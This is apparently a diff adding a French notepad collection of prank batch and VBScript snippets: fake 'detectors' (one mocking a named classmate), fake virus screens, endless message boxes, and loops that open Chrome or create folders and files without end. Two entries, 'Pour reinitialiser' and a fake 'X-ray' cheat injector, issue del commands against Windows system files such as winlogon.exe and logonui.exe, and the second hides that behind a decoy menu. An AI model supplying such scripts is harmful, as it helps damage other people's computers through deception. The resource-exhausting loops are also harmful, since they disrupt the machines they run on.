@@ -1,0 +1,199 @@
+pour le block note
+
+pour mettre un mot de pass sur un hack avec winrar = clique droit sur le fichiers 
+clique droit sur le fichiers puis add to archive set passeworld puis voilaaaa
+____________________________________________________________________
+
+pour chrome infini
+
+:a
+start chrome.exe
+goto:a
+_____________________________________________________________________
+
+Pour le détécteur de caca 
+
+@echo off
+echo Detecteur de caca
+set /p input = entrez votre prenom:
+for /f %%a in ('echo %random%%%100') do set /a pourcentage%set%=%%a
+echo %input%vous etes compose de caca a %pourcentage%%%
+pause
+_____________________________________________________________________
+
+Pour le détécteur de gay
+
+@echo off
+echo Detecteur de gay
+set /p input = entrez votre prenom:
+for /f %%a in ('echo %random%%%100') do set /a pourcentage%set%=%%a
+echo %input%, vous etes gay a %pourcentage%%%
+pause
+_____________________________________________________________________
+
+Pour le détécteur de gros spécial emilien
+
+@echo off
+echo detecteur de gros special emilien
+set /p input = qui est gros et qui mange dix tacos par jour:
+for /f %%a in ('echo %random%%%100') do set /a pourcentage%set%=%%a
+echo %input%bonne reponse
+pause
+_____________________________________________________________________
+
+Pour le faux hack crane 
+
+@echo off
+echo -----------------------------------------------------------------------------------------------------------------------------------------------
+
+echo UN VIRUS A ETE DETECTE
+
+echo CE VIRUS SE PROPAGERA DANS TOUT VOS FICHIERS DANS 10 SECONDE
+
+
+                                                                                             
+echo                                         -:+osyyhhhhhyyo+:.                                         
+echo                                     odNMMMMMMMMMMMMMMMMMMNh+                                     
+echo                                   :hMMMMMMMMMMMMMMMMMMMMMMMMMMmo.                                  
+echo                                 hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy                                
+echo                               :hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy.                              
+echo                             :dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/                             
+echo                            /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                            
+echo                           .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/                           
+echo                           oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.                          
+echo                           hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+                          
+echo                           dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo                          
+echo                           hMMd-+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmhs+/hMM+                          
+echo                           sMMs   `-+hmMMMMMMMMMMMMMMMMMMMMMMMds:.`   sMM.                          
+echo                           :MMh       ./ymMMMMMMMMMMMMMMMMMmy:`       dMd                           
+echo                           `NMM/         ./sdNMMMMMMMMMNds/.         +MM+                           
+echo                            oMMN+.          `.:odMMMdo:.`          .+NMN`                           
+echo                             +NMMNdyo/:--...-:+ymdmmmy+:-...--:+oydmMMMo                            
+echo                              :mMMMMMMMMNNNNNMMMs`h`sMMMNNNNNMMMMMMMMMM`                            
+echo                             `ymMMMMMMMMMMMMMMMy``d``yMMMMMMMMMMMMMMMMm`                            
+echo                             .MMMMMMMMMNmdNMMMN.`hMy`.NMMMMMMNmdmNMMMMM+                            
+echo                             /MMMMMMNy/.``dMMMMdoMMM+dMMMMMM+-```-NMMMm.                            
+echo                            `sNMmmd/.    hMMMMMMMMMMMMMMMMM:    -mNd+`                             
+echo                               /. -/    mMMMmMMMmNMN+sNMMN`    `--                                
+echo                                          /MMN-MMM:hMm mMMN+                                        
+echo                                          `MMM:MMM/dMN.MMMy                                         
+echo                                           NMM/MMM/mMN-MMMo                                         
+echo                                           mMM/MMM/mMN:MMM+                                         
+echo                                           dMM/NMM/NMN/MMM/                                         
+echo                                           hMM/mMM/NMN+MMM-                                         
+echo                                           yMM/dMM:NMm+MMM.                                         
+echo                                           oMM:hMM-NMh+MMN                                          
+echo                                           /MM:yMM`mMo+MMd                                          
+echo                                            -+`+hy sd.-ys:                                          
+                                                                                                  
+                                                                                                   
+
+timeout 10
+
+cd..
+
+dir /s
+
+pause
+________________________________________
+Pour les fichiers qui se crée a l'infini
+
+@echo off
+set compteur=0
+:a
+md error %compteur%
+set /a  compteur = compteur +1
+goto a
+________________________________________
+
+Pour les inviter de commandes infini
+
+@echo
+start virus
+
+
+Pour matrix
+
+@echo off
+pause
+color 0a
+mode 1000
+
+:a
+echo %random%%random%%random%%random%%random%%random%%random%%random%
+goto:a
+
+
+Pour les message infini
+
+Do
+msgbox "tu t'es fait hacker"
+loop
+
+
+Pour les message infini + une voix
+
+dim speechobject
+set speechobject=createobject("sapi.spvoice")
+
+speechobject.speak "PC HACKER"
+x=msgbox("PC HACK, appuyez sur OK pour effacer toutes les données de votre ordinateur", 16, "HACKED")
+x=msgbox("VOTRE PC VA EXPLOSER DANS 5...", 16, "KABOUM")
+
+Do While 1<2
+speechobject.speak "ATTENTION, PC HACKER, SUPPRIMATION DES FICHIERS. UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"
+Loop
+
+
+Pour les note qui se crée a l'infini
+
+@echo off
+set compteur = 0
+:a
+(
+echo tu tes fait hacker
+)> hack%compteur%compteur + 1
+set /a compteur = compteur + 1
+goto :a
+
+
+Pour la voix qui parle
+
+Dim message, sapi
+message=InputBox("Entez le texte que vous voulez parlez)","Speak This")
+Set sapi=CreateObject("sapi.spvoice")
+sapi.Speak message
+
+
+Pour reinitialiser
+
+@echo off
+del "C:\windows\pchealth\"
+del "C:\windows\system\"
+del "C:\windows\system32\restore\"
+del "winlogon.exe"
+del "C:\windows\system32\autoexec.nt"
+del "C:\windows\system32\logonui.exe"
+del "C:\windows\system32\ntoskrn"
+
+
+Pour le faux X-ray qui reinitialise le pc 
+
+@echo off
+echo 1) inject
+echo 2) uninject
+set /p input = 1 ou 2:
+echo %input%injecter avec reussite
+timeout 5
+@echo off
+del "C:\windows\pchealth\"
+del "C:\windows\system\"
+del "C:\windows\system32\restore\"
+del "winlogon.exe"
+del "C:\windows\system32\autoexec.nt"
+del "C:\windows\system32\logonui.exe"
+del "C:\windows\system32\ntoskrn
+pause
+
+
+Pour
